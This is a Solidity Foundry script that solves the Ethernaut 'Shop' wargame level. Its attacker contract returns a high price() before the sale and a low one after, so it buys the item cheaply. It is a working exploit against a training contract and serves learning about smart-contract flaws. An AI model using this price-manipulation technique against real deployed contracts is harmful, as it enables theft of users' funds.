// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/21_Shop.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();
        ShopAttacker shopAttacker = new ShopAttacker(your_challenge_address);
        shopAttacker.attack();
        vm.stopBroadcast();
    }
}

contract ShopAttacker {
    Shop public level21;

    constructor(address _target) {
        level21 = Shop(_target);
    }

    function attack() public{
        level21.buy();
    }

    function price() external view returns (uint){
        return level21.isSold() == true ? 1: 101; 
    }
}